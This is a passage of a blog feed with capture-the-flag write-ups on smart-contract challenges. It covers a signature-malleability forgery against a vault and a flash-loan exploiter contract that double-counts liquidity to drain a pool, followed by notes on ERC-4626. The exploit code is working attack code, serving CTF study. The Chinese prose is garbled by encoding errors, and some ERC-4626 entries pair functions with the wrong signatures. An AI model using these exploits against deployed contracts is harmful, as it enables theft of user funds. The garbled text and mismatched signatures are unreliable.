        <content type="html"><![CDATA[<h1 id="CTF-malleable"><a href="#CTF-malleable" class="headerlink" title="CTF-malleable"></a>CTF-malleable</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/malleable">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚æ˜¯ï¼š<br>æ‚¨ä¸€ç›´åœ¨é»‘æš—çš„æ£®æ—ä¸­å—…æ¢ï¼Œå¹¶å‘ç°äº† TreasureVault åˆåŒã€‚å®ƒéœ€è¦åˆçº¦æ‰€æœ‰è€…çš„éªŒè¯ç­¾åæ‰èƒ½æå–é€‰å®šæ•°é‡çš„ ETHã€‚</p><p>æ‚¨å·²ç»è®°å½•äº†ç”¨æˆ·åœ¨ä¹‹å‰çš„ tx ä¸­ç”¨äºæå–ä¸€äº› ETH çš„ç­¾åã€‚</p><p>è€—å°½å‰©ä½™çš„åˆçº¦èµ„é‡‘ã€‚</p><p>é¦–å…ˆå…ˆé‡Œäº†è§£ä¸€ä¸‹ç­¾åï¼Œè¿™æ˜¯æˆ‘æœ‰å­¦åˆ°çš„ä¸€ä¸ªæ–°çŸ¥è¯†ã€‚</p><h1 id="ç­¾åç»“æ„"><a href="#ç­¾åç»“æ„" class="headerlink" title="ç­¾åç»“æ„"></a>ç­¾åç»“æ„</h1><p>vã€r å’Œ s æ˜¯ä»¥å¤ªåŠç­¾åçš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ã€‚ç­¾åç”¨äºéªŒè¯æ¶ˆæ¯çš„æ¥æºå’Œå†…å®¹ã€‚<br>v æ˜¯æ¢å¤æ ‡è¯†ç¬¦ï¼Œé€šå¸¸ä¸º 27 æˆ– 28ï¼Œè¡¨ç¤ºç­¾åçš„ç‰ˆæœ¬ã€‚<br>r å’Œ s æ˜¯ç­¾åçš„è¾“å‡ºï¼Œç”¨äºç¡®ä¿æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ã€‚</p><h1 id="ç­¾åçš„ç”Ÿæˆ"><a href="#ç­¾åçš„ç”Ÿæˆ" class="headerlink" title="ç­¾åçš„ç”Ÿæˆ"></a>ç­¾åçš„ç”Ÿæˆ</h1><p>ç­¾ååŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼šrã€s å’Œ vã€‚<br>r å’Œ s æ˜¯æ¤­åœ†æ›²çº¿çš„ç‚¹ï¼Œè€Œ v è¡¨ç¤ºæ¢å¤æ ‡è¯†ç¬¦ã€‚<br>è®¡ç®— sï¼š<br>å½“ç”Ÿæˆç­¾åæ—¶ï¼Œæ¶ˆæ¯å“ˆå¸Œï¼ˆé€šå¸¸æ˜¯äº¤æ˜“æˆ–ä¿¡æ¯çš„å“ˆå¸Œï¼‰ä¼šè¢«ç”¨äºè®¡ç®— r å’Œ sã€‚<br>ç­¾åçš„ s å€¼é€šå¸¸ä¼šåœ¨ 0 åˆ°æ›²çº¿çš„å‚æ•° n ä¹‹é—´ï¼Œå› æ­¤åœ¨æ¤­åœ†æ›²çº¿ä¸­ï¼Œs å€¼æ˜¯å¯ä»¥è¢«è®¤ä¸ºæ˜¯æ¨¡åçš„ã€‚<br>æ”»å‡»è€…å¦‚ä½•è®¡ç®— s</p><h2 id="æ¨¡åæ€§ï¼š"><a href="#æ¨¡åæ€§ï¼š" class="headerlink" title="æ¨¡åæ€§ï¼š"></a>æ¨¡åæ€§ï¼š</h2><p>åœ¨æ¤­åœ†æ›²çº¿ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªæ€§è´¨ï¼Œå…è®¸å°† s å€¼â€œåè½¬â€ã€‚å…·ä½“æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªæœ‰æ•ˆçš„ sï¼Œå­˜åœ¨å¦ä¸€ä¸ªæœ‰æ•ˆçš„ s_ï¼Œä½¿å¾— s + s_ â‰¡ nï¼ˆæ¨¡ nï¼‰ï¼Œå…¶ä¸­ n æ˜¯æ¤­åœ†æ›²çº¿çš„ä¸€ä¸ªå‚æ•°ã€‚<br>å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¡ç®—ï¼š<br>ğ‘ &#x3D;ğ‘›âˆ’ğ‘ <br>è¿™é‡Œçš„ n æ˜¯ 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141ï¼Œè¿™æ˜¯ secp256k1 æ›²çº¿çš„é˜¶ã€‚</p><blockquote><p>å®ƒæ˜¯ secp256k1 æ›²çº¿çš„é˜¶ï¼ˆorderï¼‰ã€‚åœ¨æ¤­åœ†æ›²çº¿å¯†ç å­¦ä¸­ï¼Œæ›²çº¿çš„é˜¶æ˜¯æŒ‡å¯ä»¥åœ¨è¯¥æ›²çº¿ä¸Šç”Ÿæˆçš„ç‚¹çš„æ•°é‡ã€‚å…·ä½“æ¥è¯´ï¼šæ›²çº¿é˜¶ nï¼šecp256k1 æ›²çº¿çš„é˜¶ä¸º n &#x3D;0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„ç´ æ•°ã€‚è¿™ä¸ªå€¼æ˜¯ç”± secp256k1 æ ‡å‡†å®šä¹‰çš„ï¼Œé€‚ç”¨äºæ¯”ç‰¹å¸å’Œä»¥å¤ªåŠç­‰åŒºå—é“¾ã€‚</p></blockquote><p>æ¨¡è¿ç®—çš„æ€§è´¨ï¼š<br>åœ¨ä½¿ç”¨è¿™ä¸ªæ›²çº¿æ—¶ï¼Œç­¾åçš„ s å€¼é€šå¸¸ä¼šåœ¨ 0 åˆ° n-1 ä¹‹é—´ã€‚å¦‚æœ s è¶…è¿‡ nï¼Œåˆ™ä¼šè¢«æ¨¡è¿ç®—å¤„ç†ã€‚<br>ç”±äºç­¾åå¯ä»¥ç”¨ä¸åŒçš„ s å€¼è¡¨ç¤ºåŒä¸€æ¡æ¶ˆæ¯ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¡ç®— s_ &#x3D; n - s æ¥ç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆçš„æ›¿ä»£ç­¾åã€‚</p><h2 id="ç”Ÿæˆä¼ªé€ ç­¾åï¼š"><a href="#ç”Ÿæˆä¼ªé€ ç­¾åï¼š" class="headerlink" title="ç”Ÿæˆä¼ªé€ ç­¾åï¼š"></a>ç”Ÿæˆä¼ªé€ ç­¾åï¼š</h2><p> æ”»å‡»è€…å°† s æ›¿æ¢ä¸º s_ï¼Œä»è€Œç”Ÿæˆä¸€ä¸ªä¼ªé€ çš„ç­¾åã€‚æ­¤æ—¶ï¼Œv ä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´ï¼Œä»¥ç¡®ä¿ç­¾åçš„æœ‰æ•ˆæ€§ã€‚<br>ä¼ªé€ çš„ç­¾åä»ç„¶ä¼šé€šè¿‡åˆçº¦çš„éªŒè¯ï¼Œå› ä¸ºå®ƒä»ç„¶ä¸ç›¸åŒçš„æ¶ˆæ¯å“ˆå¸Œç›¸å¯¹åº”ï¼ˆåªæ˜¯ç”¨ä¸åŒçš„ s å€¼ï¼‰ã€‚</p><h2 id="ä¸ºä»€ä¹ˆæœ‰æ•ˆ"><a href="#ä¸ºä»€ä¹ˆæœ‰æ•ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆæœ‰æ•ˆ"></a>ä¸ºä»€ä¹ˆæœ‰æ•ˆ</h2><p>å½“åˆçº¦éªŒè¯ç­¾åæ—¶ï¼Œå®ƒåªéœ€è¦ç¡®è®¤ r å’Œ s æ˜¯å¦å¯¹åº”äºç»™å®šçš„æ¶ˆæ¯ï¼ˆå³å“ˆå¸Œï¼‰ã€‚<br>ç”±äº s_ å’Œ s æ˜¯é€šè¿‡æ¨¡åå¾—åˆ°çš„ï¼Œå®ƒä»¬ä»ç„¶æ˜¯æœ‰æ•ˆçš„ç­¾åï¼Œåˆçº¦å°†æ¥å—å®ƒï¼Œè®¤ä¸ºæ”»å‡»è€…æ˜¯æœ‰æ•ˆçš„è¯·æ±‚è€…ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨s_æ„é€ ä¸€ä¸ªå‡ç­¾åå°±å¯ä»¥äº†ã€‚ç„¶åç›´æ¥å®ç°å–æ¬¾ã€‚<br>è¿™æ˜¯æµ‹è¯•åˆçº¦çš„ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// solves the challenge</span><br><span class="line">   function testChallengeExploit() public &#123;</span><br><span class="line">       vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">       uint8 v_ = v == 27 ? 28 : 27;</span><br><span class="line">       bytes32 s_ = bytes32(</span><br><span class="line">           uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - </span><br><span class="line">           uint256(s)</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       treasureVault.sendFundsWithAuth(1e18,0,v_,r,s_);</span><br><span class="line"></span><br><span class="line">       vm.stopPrank();</span><br><span class="line">       validation();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Side-Entrance</title>
      <link href="/2024/10/28/CTF-Side-Entrance/"/>
      <url>/2024/10/28/CTF-Side-Entrance/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Side-Entrance"><a href="#CTF-Side-Entrance" class="headerlink" title="CTF-Side-Entrance"></a>CTF-Side-Entrance</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/side-entrance">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼š<br>æœ‰ä¸€ä¸ª CallOptions åˆçº¦ï¼Œå…è®¸ç”¨æˆ·åˆ›å»ºå¤‡å…‘ wETH-USDC çœ‹æ¶¨æœŸæƒã€‚</p><p>ä»–ä»¬ç”šè‡³æä¾›äº† functionality å…è®¸ç”¨æˆ·é€šè¿‡ä½¿ç”¨ Uniswap é—ªç”µè´·åœ¨æ²¡æœ‰ä»»ä½•èµ„é‡‘çš„æƒ…å†µä¸‹æ‰§è¡Œä»–ä»¬è´­ä¹°çš„æœŸæƒã€‚</p><p>æ‚¨çš„ä»»åŠ¡æ˜¯çªƒå–è‡³å°‘ 90k USDCã€‚æ‚¨å¼€å§‹æ²¡æœ‰èµ„é‡‘ã€‚</p><p>æ–­æ›´ä¸­ï¼Œå…³äºé—ªç”µè´·åŠ æµåŠ¨æ€§çš„é¢˜çœŸçš„å¾ˆéš¾ï¼Œå‡†å¤‡æŠŠuinswapå®¶æ—å­¦å®Œäº†å†æ¥è§£é¢˜ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-safu-swapper</title>
      <link href="/2024/10/27/CTF-safu-swapper/"/>
      <url>/2024/10/27/CTF-safu-swapper/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-safu-swapper"><a href="#CTF-safu-swapper" class="headerlink" title="CTF-safu-swapper"></a>CTF-safu-swapper</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-swapper">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼šè¿˜æ˜¯è·å¾—poolæ± çš„å…¨éƒ¨ä»£å¸</p><p>è¿™é¢˜åˆçº¦ï¼Œæœ‰ä¿©ä¸ªï¼Œä¸€ä¸ªä¸»è¦å®ç°è®¡ç®—ï¼Œä¸€ä¸ªä¸»è¦å®ç°æµåŠ¨æ€§æ± ï¼Œ<br>é¦–å…ˆä¸»è¦å°±æ˜¯çœ‹åˆçº¦æµåŠ¨æ€§æä¾›è€…ï¼Œæ€æ ·æ”¹å˜æµåŠ¨æ€§ï¼Œæ˜¯å¦æœ‰æ¼æ´ï¼Œæœç„¶è¢«å‘ç°åœ¨è®¡ç®—ä»½é¢ï¼ˆæä¾›æµåŠ¨æ€§è€…ï¼Œå°†è·å¾—ä»½é¢ï¼‰æ—¶ï¼Œå‘ç°ä½¿ç”¨çš„æ˜¯ <code> uint amount = IERC20(token).balanceOf(pool);</code> <code> return (amount.mul(units)).div(totalSupply);</code> è€Œæˆ‘ä»¬åœ¨Safupoolåˆçº¦ä¸­ï¼Œå¹¶æ²¡æœ‰å‘ç°èƒ½æ”¹å˜ <code>baseAmount</code>ï¼Œ<code>tokenAmount</code>,æ¢å¥è¯æ¥è¯´ï¼Œå°±æ˜¯åœ¨æˆ‘ä»¬ä»¥<code>transfer</code>è½¬å…¥ä»£å¸æ—¶åˆçº¦ä¸ä¼šæ›´æ–°<code>baseAmount</code>ï¼Œ<code>tokenAmount</code>ï¼Œå®é™…ä¸Šåˆçº¦æ˜¯é€šè¿‡ <code>uint amount = IERC20(token).balanceOf(pool);</code>æ¥è®¡ç®—ä»½é¢ï¼Œpoolä¼šè®¤ä¸ºå·²ç»æ”¶åˆ°äº†è½¬è´¦ã€‚<br>å¢åŠ æµåŠ¨æ€§ï¼šæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) public returns (uint liquidityUnits) &#123;</span><br><span class="line">       IERC20(BASE).transferFrom(msg.sender,address(this),_baseAmount);</span><br><span class="line">       IERC20(TOKEN).transferFrom(msg.sender,address(this),_tokenAmount);</span><br><span class="line">       liquidityUnits = addLiquidityForMember(msg.sender);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç§»é™¤æµåŠ¨æ€§ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function removeAllLiquidity() public returns (uint outputBase, uint outputToken) &#123;</span><br><span class="line">        transfer(address(this),balanceOf(msg.sender)); // transfer all LP units for withdrawing liq</span><br><span class="line">        return removeLiquidityForMember(msg.sender);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>å‡è®¾pooLä¸­æœ‰ä¿©ä¸ªä»£å¸ï¼Œusdc,token;</p><ul><li>usdc :1000</li><li>token :1000</li><li>ä½ çš„lp ï¼›100<br>ç„¶åä½ å‘è¿™ä¸ªpoolä¸­è½¬å…¥ä»£å¸å¢åŠ æµåŠ¨æ€§ï¼Œ<br>ç†æƒ³ä¸Šæ˜¯è¿™æ ·çš„ï¼š</li><li>usdc :1100</li><li>token :1100</li><li>ä½ çš„lp :110<br>ä½†æ˜¯ç”±äºbaseamount,tokenamount,å¹¶æ²¡æœ‰æ›´æ–°<br>æ‰€ä»¥poolè™½ç„¶å¢åŠ äº†ï¼Œä½†æ˜¯å†…éƒ¨çŠ¶æ€å¹¶æ²¡æœ‰æ›´æ–°ï¼Œå®é™…ä¸Šæ˜¯è¿™æ ·çš„ï¼š</li><li>usdc:1100</li><li>token:1100</li><li>ä½ çš„lp :100<br>ç„¶ååœ¨ç§»é™¤æµåŠ¨æ€§çš„æ—¶å€™ï¼Œå®ƒæ˜¯è®¡ç®—çš„æ˜¯å®é™…çš„ï¼Œç§»é™¤æµåŠ¨æ€§æ—¶ï¼Œæ˜¯æŒ‰ç…§usdc&#x3D;1100,token&#x3D;1100æ¥è®¡ç®—çš„ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½è·å¾—æ›´å¤šçš„ä»£å¸ï¼Œå¦‚æœæˆ‘ä»¬é‡æ–°å¢æ·»æµåŠ¨æ€§ï¼Œç”±äºåˆçº¦ä¸­æœªæ›´æ–°çŠ¶æ€ï¼Œæ‰€ä»¥åˆšåˆšè½¬çš„100ä»£å¸ï¼Œä¼šè¯¯ä»¥ä¸ºç»™æ”»å‡»è€…å¢åŠ lpä»£å¸ï¼Œç„¶åæ”»å‡»è€…å°±å†æ¬¡åˆ©ç”¨è¿™ä¸ªlpè·å¾—æ›´å¤šçš„ä»£å¸ã€‚é€šç”¨åè¯ï¼ŒåŒé‡è®¡ç®—ã€‚</li></ul><p>æ”»å‡»åˆçº¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    function swap(</span><br><span class="line">        uint amount0Out, </span><br><span class="line">        uint amount1Out, </span><br><span class="line">        address to, </span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface ISafuPool &#123;</span><br><span class="line">    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);</span><br><span class="line">    function swap(address toToken, uint256 amount) external returns (uint);</span><br><span class="line">    function removeAllLiquidity() external returns (uint, uint);</span><br><span class="line">    function approve(address, uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @dev Exploiter contract for SafuPool</span><br><span class="line">contract SwapperExploiter &#123;</span><br><span class="line"></span><br><span class="line">    IUniswapV2Pair pair;</span><br><span class="line">    ISafuPool safuPool;</span><br><span class="line">    IERC20 usdc;</span><br><span class="line">    IERC20 safu;</span><br><span class="line"></span><br><span class="line">    /// @dev Runs exploit, flashloan borrows Uniswap USDC liq</span><br><span class="line">    function runExploit(</span><br><span class="line">        address _uniswapPair, // DAI-USDC pair</span><br><span class="line">        address _safuPool,</span><br><span class="line">        address _usdc,</span><br><span class="line">        address _safu,</span><br><span class="line">        uint256 amount // flashloan amount required</span><br><span class="line">    ) external &#123;</span><br><span class="line">        pair = IUniswapV2Pair(_uniswapPair);</span><br><span class="line">        safuPool = ISafuPool(_safuPool);</span><br><span class="line">        usdc = IERC20(_usdc);</span><br><span class="line">        safu = IERC20(_safu);</span><br><span class="line"></span><br><span class="line">        usdc.approve(address(safuPool),type(uint256).max);</span><br><span class="line">        safu.approve(address(safuPool),type(uint256).max);</span><br><span class="line"></span><br><span class="line">        pair.swap(amount,0,address(this),bytes(&#x27;not empty&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Uniswap flashloan callback</span><br><span class="line">    /// @dev Swaps done in batches b/c extra fees for large swaps</span><br><span class="line">    function uniswapV2Call(</span><br><span class="line">        address _sender, </span><br><span class="line">        uint256 _amount0, // usdc</span><br><span class="line">        uint256 _amount1,</span><br><span class="line">        bytes calldata _data</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(msg.sender == address(pair), &#x27;callback&#x27;);</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;5; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(safu),8_000*1e18); // get some SAFU tokens</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 safuAmount = safu.balanceOf(address(this));</span><br><span class="line">        safuPool.addLiquidity(safuAmount, safuAmount); // add equal parts tokens for liq</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;5; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(safu),8_000*1e18); // get more SAFU tokens</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        safuAmount = safu.balanceOf(address(this));</span><br><span class="line">        safu.transfer(address(safuPool),safuAmount); // transfer all SAFU</span><br><span class="line">        usdc.transfer(address(safuPool),600_000*1e18); // transfer large amount of USDC</span><br><span class="line"></span><br><span class="line">        safuPool.removeAllLiquidity(); // effectively double counts the transfers done earlier</span><br><span class="line">        safuPool.addLiquidity(0,0); // get LP which is the double counted</span><br><span class="line">        safuPool.removeAllLiquidity(); // get base funds for the double counted LP</span><br><span class="line"></span><br><span class="line">        uint256 amountPerRound = safu.balanceOf(address(this)) / 10;</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;10; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(usdc), amountPerRound); // dump remaining SAFU for USDC</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed</span><br><span class="line">        usdc.transfer(msg.sender,loanPlusInterest); // pay back flashloan</span><br><span class="line">        usdc.transfer(tx.origin,usdc.balanceOf(address(this))); // lazy</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="è¡¥å……ï¼šæµåŠ¨æ± çš„LPè®¡ç®—"><a href="#è¡¥å……ï¼šæµåŠ¨æ± çš„LPè®¡ç®—" class="headerlink" title="è¡¥å……ï¼šæµåŠ¨æ± çš„LPè®¡ç®—"></a>è¡¥å……ï¼šæµåŠ¨æ± çš„LPè®¡ç®—</h1><p>æµåŠ¨æ€§æ± çš„ LP ä»£å¸è®¡ç®—<br>æµåŠ¨æ€§æ± çš„æ€»èµ„äº§ï¼š</p><p>å‡è®¾æµåŠ¨æ€§æ± ä¸­æœ‰ baseAmountï¼ˆä¾‹å¦‚ SAFUï¼‰å’Œ tokenAmountï¼ˆä¾‹å¦‚ USDCï¼‰ã€‚<br>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼ŒLP ä»£å¸çš„é“¸é€ ä¸æµåŠ¨æ€§æ± çš„èµ„äº§çŠ¶æ€æ˜¯ç›´æ¥å…³è”çš„ã€‚<br>æ·»åŠ æµåŠ¨æ€§æ—¶çš„ LP ä»£å¸è®¡ç®—ï¼š</p><p>å½“ç”¨æˆ·å‘æ± ä¸­æ·»åŠ æµåŠ¨æ€§æ—¶ï¼Œä¼šè®¡ç®—åº”é“¸é€ çš„ LP ä»£å¸æ•°é‡ï¼Œå…¬å¼é€šå¸¸æ˜¯ï¼š<br>æ–°Â LPÂ ä»£å¸æ•°é‡&#x3D;å­˜å…¥èµ„äº§&#x2F;æ€»èµ„äº§Ã—ç°æœ‰Â LPÂ ä»£å¸æ€»æ•°</p><p>è¿™ç¡®ä¿äº†æµåŠ¨æ€§æ± çš„æ¯ä¸ªæµåŠ¨æ€§æä¾›è€…éƒ½æ ¹æ®ä»–ä»¬çš„è´¡çŒ®è·å¾—ç›¸åº”æ¯”ä¾‹çš„ LP ä»£å¸ã€‚<br>ç§»é™¤æµåŠ¨æ€§æ—¶çš„ LP ä»£å¸è®¡ç®—ï¼š<br>å½“è°ƒç”¨ removeAllLiquidity() æ—¶ï¼Œåˆçº¦ä¼šæ ¹æ®æŒæœ‰çš„ LP ä»£å¸æ•°é‡æ¥è®¡ç®—ç”¨æˆ·å¯ä»¥æå–çš„åŸºç¡€èµ„äº§ï¼š<br>æå–çš„Â SAFU&#x3D;ç”¨æˆ·æŒæœ‰çš„Â LPÂ ä»£å¸&#x2F;æ€»Â LPÂ ä»£å¸Ã—å½“å‰Â SAFUÂ æ€»é‡<br>æå–çš„Â USDC&#x3D; ç”¨æˆ·æŒæœ‰çš„Â LPÂ ä»£å¸&#x2F;æ€»Â LPÂ ä»£å¸Ã—å½“å‰Â USDCÂ æ€»é‡</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC4626</title>
      <link href="/2024/10/27/ERC4626/"/>
      <url>/2024/10/27/ERC4626/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC4626"><a href="#ERC4626" class="headerlink" title="ERC4626"></a>ERC4626</h1><h2 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h2><p>ERC-4626 æ˜¯ä¼˜åŒ–å’Œç»Ÿä¸€æ”¶ç›Šèµ„é‡‘åº“æŠ€æœ¯å‚æ•°çš„æ ‡å‡†ã€‚ å®ƒä¸ºè¡¨ç¤ºå•ä¸ªåº•å±‚ ERC-20 ä»£å¸çš„ä»½é¢çš„ä»£å¸åŒ–æ”¶ç›Šèµ„é‡‘åº“æä¾›æ ‡å‡†åº”ç”¨ç¨‹åºæ¥å£ã€‚ ERC-4626 è¿˜æ¦‚è¿°äº†ä½¿ç”¨ ERC-20 çš„ä»£å¸åŒ–èµ„é‡‘åº“çš„å¯é€‰æ‰©å±•ï¼Œæä¾›å­˜æ¬¾ã€æå–ä»£å¸å’Œè¯»å–ä½™é¢çš„åŸºæœ¬åŠŸèƒ½ã€‚</p><p>å®ƒä¸»è¦æ˜¯è¿ç”¨åœ¨æ”¶ç›Šé‡‘åº“ä¸­</p><h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p>assetï¼šç”± Vault ç®¡ç†çš„åŸºç¡€ Tokenã€‚ å…·æœ‰ç”±ç›¸åº”çš„ EIP-20 åˆçº¦å®šä¹‰çš„å•ä½ã€‚<br>shareï¼šVault çš„ tokenã€‚å…·æœ‰æ ‡çš„èµ„äº§æ¯”ç‡ åœ¨ Mint &#x2F; Deposit &#x2F; Withdraw&#x2F;redeem ï¼ˆç”± Vault å®šä¹‰ï¼‰ æ—¶å…‘æ¢ã€‚<br>feeï¼šVault å‘ç”¨æˆ·æ”¶å–çš„èµ„äº§æˆ–ä»½é¢æ•°é‡ã€‚å¯ä»¥å­˜åœ¨è´¹ç”¨ å­˜æ¬¾ã€æ”¶ç›Šã€AUMã€ææ¬¾æˆ– Vault è§„å®šçš„ä»»ä½•å…¶ä»–å†…å®¹ã€‚<br>æ»‘ç‚¹ï¼šå¹¿å‘Šè‚¡ä»·ä¸ç»æµç°å®ä¹‹é—´çš„ä»»ä½•å·®å¼‚ å­˜æ¬¾åˆ°é‡‘åº“æˆ–ä»é‡‘åº“å–æ¬¾ï¼Œä¸è®¡å…¥è´¹ç”¨ã€‚</p><h2 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h2><p>asset :<code>function asset() public view returns (address assetTokenAddress)</code><br>å‡½æ•°è¿”å›ç”¨äºèµ„é‡‘åº“è®°è´¦ï¼Œå­˜æ¬¾ï¼Œå–æ¬¾çš„å¸¦ä»£å¸åœ°å€ã€‚</p><p>totalAsset:<code>function convertToShares(uint256 assets) public view returns (uint256 shares)</code><br>å‡½æ•°è¿”å›èµ„é‡‘åº“æŒæœ‰çš„èµ„é‡‘æ€»é‡</p><p>converToShare:<code>function convertToShares(uint256 assets) public view returns (uint256 shares)</code><br>å‡½æ•°è¿”å›sharesçš„æ•°é‡ï¼Œè¯¥æ•°é‡å°†ç”±èµ„é‡‘åº“å…‘æ¢ä¸ºæä¾›çš„assetsæ•°é‡</p><p>convertToAssets :<code>function convertToAssets(uint256 shares) public view returns (uint256 assets)</code><br>å‡½æ•°è¿”å›assetsæ•°é‡ï¼Œè¯¥æ•°é‡ç”±èµ„é‡‘åº“å…‘æ¢æˆä¸ºæä¾›çš„sharesæ•°é‡</p><p>maxDeposit:function <code>maxDeposit(address receiver) public view returns (uint256 maxAssets)</code><br>å‡½æ•°è¿”å›receiverçš„ä¸€æ¬¡depositè°ƒç”¨ä¸­å¯ä»¥å­˜å…¥çš„æœ€å¤§èµ„äº§æ•°é‡</p><p>previewDeposit:<code>function previewDeposit(uint256 assets) public view returns (uint256 shares)</code><br>å‡½æ•°å…è®¸ç”¨æˆ·æ¨¡æ‹Ÿä»–ä»¬åœ¨å½“å‰åŒºå—çš„å­˜å–æ•ˆæœ</p><p>depositï¼š<code>function deposit(uint256 assets, address receiver) public returns (uint256 shares)</code><br>å‡½æ•°å°†ä»£å¸assertså­˜å…¥èµ„é‡‘åº“ï¼Œå¹¶å°†sharesçš„æ‰€æœ‰æƒæˆäºˆreceiver</p><p>maxMint :<code>function maxMint(address receiver) public view returns (uint256 maxShares)</code><br>å‡½æ•°è¿”å›receiveråœ¨å•æ¬¡mintdè°ƒç”¨ä¸­å¯ä»¥é“¸é€ çš„æœ€å¤§ä»½é¢ã€‘</p><p>previewMintï¼š<code>function maxMint(address receiver) public view returns (uint256 maxShares)</code><br>å‡½æ•°å…è®¸ç”¨æˆ·åœ¨å½“å‰åŒºå—æ¨¡æ‹Ÿä»–ä»¬é“¸å¸æ•ˆæœ</p><p>mintï¼š<code>function mint(uint256 shares, address receiver) public returns (uint256 assets)</code><br>å‡½æ•°é€šè¿‡å­˜å…¥ä»£å¸çš„assets,å°†sharesèµ„é‡‘åº“ä»½é¢å‡†ç¡®çš„é“¸é€ æ­åˆ°receiverã€‚</p><p>maxWithdraw:<code>function maxWithdraw(address owner) public view returns (uint256 maxAssets)</code><br>å‡½æ•°è¿”å›å¯ä»¥é€šè¿‡å•æ¬¡ withdraw è°ƒç”¨ä» owner ä½™é¢ä¸­æå–çš„æœ€å¤§æ ‡çš„èµ„äº§æ•°é‡ã€‚</p><p>previewWithdraw:<code>function previewWithdraw(uint256 assets) public view returns (uint256 shares)</code><br>å‡½æ•°å…è®¸ç”¨æˆ·æ¨¡æ‹Ÿä»–ä»¬åœ¨å½“å‰åŒºå—å–æ¬¾çš„æ•ˆæœ</p><p>withdraw:<code>function withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)</code><br>å‡½æ•°ä» owner çƒ§å½• sharesï¼Œå¹¶å°† assets ä»£å¸ä»èµ„é‡‘åº“å‡†ç¡®å‘é€åˆ° receiverã€‚</p><p>maxRedeem:<code>function 